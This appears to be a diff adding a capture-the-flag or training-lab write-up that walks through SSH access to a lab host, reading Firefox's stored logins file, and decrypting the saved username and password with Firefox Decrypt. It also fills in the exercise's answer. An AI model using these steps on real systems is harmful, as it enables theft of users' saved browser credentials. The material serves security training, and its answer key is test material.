@@ -480,5 +480,50 @@ elapsed time = 0.2310788631439209
 ```
 
 ## Questions
-SSH to  with user `kira` and password `L0vey0u1!`
-1. Examine the target and find out the password of the user Will. Then, submit the password as the answer. **Answer:**
+SSH to 10.129.10.73 with user `kira` and password `L0vey0u1!`
+1. Examine the target and find out the password of the user Will. Then, submit the password as the answer. **Answer: TUqr7QfLTLhruhVbCP**
+   - `$ ssh kira@10.129.10.73` → SSH to the target machine
+   - Look for stored browser credentials:
+      ```sh
+      $ ls -l .mozilla/firefox/ | grep default 
+      drwx------  2 kira kira 4096 Feb  9  2022 lktd9y8y.default
+      drwx------ 10 kira kira 4096 Feb  9  2022 ytb95ytb.default-release
+      kira@nix01:~$ cat .mozilla/firefox/ytb95ytb.default-release/logins.json | jq .
+      {
+        "nextId": 2,
+        "logins": [
+          {
+            "id": 1,
+            "hostname": "https://dev.inlanefreight.com",
+            "httpRealm": null,
+            "formSubmitURL": "https://dev.inlanefreight.com",
+            "usernameField": "email",
+            "passwordField": "password",
+            "encryptedUsername": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEuPp+tkcSROBBikTaPORjVYFBK/x6zuYjnhWGHhp6xu2ok=",
+            "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECFinWQ8t9QusBBg6tPWTkhxcMRHwvfUZBs9zUh8mQ6MgpYI=",
+            "guid": "{317acef6-be5a-4df2-abfc-ce0566b6e975}",
+            "encType": 1,
+            "timeCreated": 1644420310215,
+            "timeLastUsed": 1644420310215,
+            "timePasswordChanged": 1644420310215,
+            "timesUsed": 1
+          }
+        ],
+        "potentiallyVulnerablePasswords": [],
+        "dismissedBreachAlertsByLoginGUID": {},
+        "version": 3
+      }
+      ```
+   - Install the [Firefox Decrypt](https://github.com/unode/firefox_decrypt) tool on the attack host and transfer it to the target machine:
+   - Run the tool to decrypt the encrypted username and password:
+      ```sh
+      $ python3.9 firefox_decrypt.py 
+      Select the Mozilla profile you wish to decrypt
+      1 -> lktd9y8y.default
+      2 -> ytb95ytb.default-release
+      2
+
+      Website:   https://dev.inlanefreight.com
+      Username: 'will@inlanefreight.htb'
+      Password: 'TUqr7QfLTLhruhVbCP'
+      ```
